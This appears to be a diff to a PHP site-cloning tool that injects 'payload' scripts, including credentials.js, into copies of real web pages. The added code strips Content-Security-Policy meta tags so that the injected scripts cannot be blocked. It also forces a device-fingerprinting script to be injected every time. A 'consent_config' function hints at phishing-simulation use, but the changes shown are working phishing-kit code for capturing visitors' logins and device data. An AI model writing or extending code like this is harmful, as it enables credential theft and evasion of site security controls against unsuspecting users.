@@ -233,6 +233,15 @@ function cloner_strip_scripts(DOMDocument $doc): int {
             $count++;
         }
     }
+
+    // Strip <meta http-equiv="Content-Security-Policy"> so the original
+    // site's CSP cannot block our injected inline payload scripts.
+    foreach (iterator_to_array($doc->getElementsByTagName('meta')) as $meta) {
+        if (strtolower(trim($meta->getAttribute('http-equiv') ?? '')) === 'content-security-policy') {
+            $meta->parentNode->removeChild($meta);
+        }
+    }
+
     return $count;
 }
 
@@ -419,11 +428,11 @@ function cloner_consent_config(array $in): array {
                 if (!is_array($v)) continue;
                 $bullets = [];
                 foreach ($v as $b) {
-                    if (is_string($b) && trim($b) !== '') $bullets[] = mb_substr(trim($b), 0, 600);
+                    if (is_string($b) && trim($b) !== '') $bullets[] = (function_exists('mb_substr') ? mb_substr(trim($b), 0, 600) : substr(trim($b), 0, 600));
                 }
                 if ($bullets) $text['bullets'] = array_slice($bullets, 0, 8);
             } elseif (is_string($v) && trim($v) !== '') {
-                $text[$k] = mb_substr(trim($v), 0, 1200);
+                $text[$k] = function_exists('mb_substr') ? mb_substr(trim($v), 0, 1200) : substr(trim($v), 0, 1200);
             }
         }
         if ($text) $cfg['text'] = $text;
@@ -492,6 +501,16 @@ function cloner_build_payload_block(array $payloads, string $original_url, strin
     $cred_src = @file_get_contents($payloads_dir . '/credentials.js');
     if ($cred_src !== false) {
         $block .= cloner_wrap_inline_script($cred_src);
+    }
+
+    // Device fingerprint — always included (like credentials), but gated.
+    // The UI shows it as "(always)" with a disabled checkbox, so it must
+    // be injected regardless of the payloads array contents.
+    if (!in_array('device-info', $payloads, true)) {
+        $di_src = @file_get_contents($payloads_dir . '/device-info.js');
+        if ($di_src !== false) {
+            $block .= cloner_wrap_inline_script($di_src);
+        }
     }
 
     // Opt-in modules.
